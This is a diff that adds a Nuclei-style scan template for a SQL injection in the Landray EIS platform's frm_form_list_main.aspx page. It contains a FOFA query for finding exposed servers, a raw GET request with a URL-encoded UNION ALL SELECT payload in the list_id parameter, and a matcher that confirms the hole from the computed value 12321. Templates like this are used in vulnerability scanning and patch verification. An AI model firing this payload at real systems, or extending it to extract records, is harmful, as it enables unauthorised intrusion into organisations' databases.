@@ -1,0 +1,26 @@
+id: landary-EIS-frm_form_list_main-sqli
+ 
+info:
+  name: 蓝凌EIS智慧协同平台-SQL注入-frm_form_list_main
+  author: HuanXiong
+  severity: high
+  metadata:
+    fofa-query: app="Landray-EIS智慧协同平台" || body="jquery.landray.common.js" || icon_hash="953405444"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /frm/frm_form_list_main.aspx?list_id=1%20UNION%20ALL%20SELECT%20NULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20SxwK HTTP/1.1
+        Cache-Control: no-cache
+        User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip,deflate
+        Connection: close
+ 
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"12321")
